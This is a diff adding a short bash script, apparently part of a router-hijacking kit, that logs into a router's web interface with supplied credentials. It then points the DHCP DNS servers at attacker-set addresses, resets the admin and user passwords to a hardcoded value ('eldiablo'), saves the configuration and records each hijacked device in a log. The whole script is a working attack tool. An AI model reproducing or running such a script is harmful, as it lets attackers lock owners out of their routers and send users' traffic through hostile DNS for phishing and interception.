@@ -1,0 +1,20 @@
+#!/bin/bash
+
+##########################
+# by bonny               #
+##########################
+# CONFIG
+source configs/changers.cfg
+HOSTNAME="$1"
+USERNAME="$2"
+PASSWORD="$3"
+PASSWD="eldiablo"
+###########################
+
+${CURL} -u "$USERNAME:$PASSWORD" "http://$HOSTNAME/doc/dns_conf.htm?WINDWEB_URL=/doc/dns_conf.htm&dns_option=2&LAN_DHCP_ed_DNS_server=$DNS1&LAN_DHCP_preferred_DNS_server=$DNS1&LAN_DHCP_alt_DNS_server=$DNS2" 1>/dev/null 2>/dev/null
+${CURL} -u "$USERNAME:$PASSWORD" "http://$HOSTNAME/doc/pwdadmin.htm?WINDWEB_URL=/doc/pwdadmin.htm&verify_pwd=$PASSWD&admin_pwd=$PASSWD" 1>/dev/null 2>/dev/null
+${CURL} -u "$USERNAME:$PASSWORD" "http://$HOSTNAME/doc/pwduser.htm?WINDWEB_URL=/doc/pwduser.htm&verify_pwd=$PASSWD&user_pwd=$PASSWD" 1>/dev/null 2>/dev/null
+${CURL} -u "$USERNAME:$PASSWORD" "http://$HOSTNAME/doc/dosave.htm" 1>/dev/null 2>/dev/null
+
+echo "[+] modificado, http://${HOSTNAME} ${USERNAME}:${PASSWORD} [KAIOMY]"
+echo "http://${HOSTNAME} (${USERNAME}:${PASSWORD} => ${PASSWD}) [KAIOMY]" >> logs/modificados.log
